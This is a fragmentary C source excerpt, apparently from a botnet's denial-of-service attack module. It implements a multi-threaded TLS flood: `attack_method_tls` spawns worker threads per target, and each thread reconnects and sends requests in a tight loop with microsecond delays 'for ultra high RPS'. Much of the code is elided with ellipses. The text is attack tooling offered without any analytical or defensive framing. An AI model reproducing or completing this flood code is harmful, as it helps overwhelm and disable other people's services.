...
#define TLS_MAX_RETRIES 5
#define TLS_CONNECTION_TIMEOUT 2
#define TLS_REQUEST_TIMEOUT 1

// Enhanced User Agents for TLS attacks
...
static BOOL establish_tls_connection(struct tls_connection *conn)
{
    ...
    timeout.tv_sec = TLS_CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    ...
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        ...
        tv.tv_sec = TLS_CONNECTION_TIMEOUT;
        tv.tv_usec = 0;
...
static BOOL send_tls_request(struct tls_connection *conn)
{
    char request_buffer[TLS_BUFFER_SIZE];
...
{
    struct tls_worker_data *data = (struct tls_worker_data *)arg;
    ...
    while (TRUE) {
        ...
        if (!conn.connected) {
            if (!establish_tls_connection(&conn)) {
                usleep(1); // 1 microsecond delay for ultra high RPS
                conn.retry_count++;
                if (conn.retry_count > TLS_MAX_RETRIES) {
...
void attack_method_tls(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    pthread_t *threads = NULL;
    struct tls_worker_data *worker_data = NULL;
    ...
    worker_data = malloc(max_threads * sizeof(struct tls_worker_data));
    ...
    for (i = 0; i < targs_len; i++) {
        ...
        for (int j = 0; j < threads_per_target; j++) {
            ...
            if (pthread_create(&threads[thread_count], NULL, tls_worker_thread, &worker_data[thread_count]) != 0) {
